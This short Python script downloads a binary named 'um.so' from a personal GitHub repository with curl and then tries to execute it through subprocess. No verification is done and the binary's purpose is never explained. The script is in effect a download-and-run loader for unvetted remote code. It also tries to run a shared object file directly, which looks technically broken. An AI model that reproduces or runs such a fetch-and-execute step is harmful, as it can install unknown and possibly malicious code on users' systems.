import subprocess

# Replace 'um.so_url' with the raw URL to the 'um.so' file on GitHub.
um_so_url = "https://github.com/Saoud060/Approval/raw/main/um.so"

# Download the shared object file.
subprocess.run(["curl", "-o", "um.so", um_so_url])

# Run the shared object file.
try:
    subprocess.run(["./um.so"])
except Exception as e:
    print(f"Error: {e}")
